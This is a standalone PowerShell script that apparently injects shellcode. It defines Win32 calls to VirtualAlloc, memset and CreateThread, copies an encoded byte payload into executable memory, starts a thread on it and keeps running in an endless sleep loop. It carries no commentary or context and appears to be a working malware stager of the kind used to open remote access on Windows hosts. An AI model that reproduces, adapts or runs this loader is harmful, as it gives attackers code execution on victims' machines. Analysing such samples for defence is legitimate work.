
$Oh2f = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Oh2f -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xcf,0xbf,0xf1,0x72,0xe4,0xdd,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x31,0x7e,0x18,0x83,0xc6,0x04,0x03,0x7e,0xe5,0x90,0x11,0x21,0xed,0xd7,0xda,0xda,0xed,0xb7,0x53,0x3f,0xdc,0xf7,0x00,0x4b,0x4e,0xc8,0x43,0x19,0x62,0xa3,0x06,0x8a,0xf1,0xc1,0x8e,0xbd,0xb2,0x6c,0xe9,0xf0,0x43,0xdc,0xc9,0x93,0xc7,0x1f,0x1e,0x74,0xf6,0xef,0x53,0x75,0x3f,0x0d,0x99,0x27,0xe8,0x59,0x0c,0xd8,0x9d,0x14,0x8d,0x53,0xed,0xb9,0x95,0x80,0xa5,0xb8,0xb4,0x16,0xbe,0xe2,0x16,0x98,0x13,0x9f,0x1e,0x82,0x70,0x9a,0xe9,0x39,0x42,0x50,0xe8,0xeb,0x9b,0x99,0x47,0xd2,0x14,0x68,0x99,0x12,0x92,0x93,0xec,0x6a,0xe1,0x2e,0xf7,0xa8,0x98,0xf4,0x72,0x2b,0x3a,0x7e,0x24,0x97,0xbb,0x53,0xb3,0x5c,0xb7,0x18,0xb7,0x3b,0xdb,0x9f,0x14,0x30,0xe7,0x14,0x9b,0x97,0x6e,0x6e,0xb8,0x33,0x2b,0x34,0xa1,0x62,0x91,0x9b,0xde,0x75,0x7a,0x43,0x7b,0xfd,0x96,0x90,0xf6,0x5c,0xfe,0x55,0x3b,0x5f,0xfe,0xf1,0x4c,0x2c,0xcc,0x5e,0xe7,0xba,0x7c,0x16,0x21,0x3c,0x83,0x0d,0x95,0xd2,0x7a,0xae,0xe6,0xfb,0xb8,0xfa,0xb6,0x93,0x69,0x83,0x5c,0x64,0x96,0x56,0xc8,0x61,0x00,0x99,0xa5,0x6a,0xc8,0x71,0xb4,0x6a,0xe9,0x3a,0x31,0x8c,0xb9,0x6c,0x12,0x01,0x79,0xdd,0xd2,0xf1,0x11,0x37,0xdd,0x2e,0x01,0x38,0x37,0x47,0xab,0xd7,0xee,0x3f,0x43,0x41,0xab,0xb4,0xf2,0x8e,0x61,0xb1,0x34,0x04,0x86,0x45,0xfa,0xed,0xe3,0x55,0x6a,0x1e,0xbe,0x04,0x3c,0x21,0x14,0x22,0xc0,0xb7,0x93,0xe5,0x97,0x2f,0x9e,0xd0,0xdf,0xef,0x61,0x37,0x54,0x39,0xf4,0xf8,0x02,0x46,0x18,0xf9,0xd2,0x10,0x72,0xf9,0xba,0xc4,0x26,0xaa,0xdf,0x0a,0xf3,0xde,0x4c,0x9f,0xfc,0xb6,0x21,0x08,0x95,0x34,0x1c,0x7e,0x3a,0xc6,0x4b,0x7e,0x06,0x11,0xb5,0xf4,0x66,0xa1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$i9U=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($i9U.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$i9U,0,0,0);for (;;){Start-sleep 60};

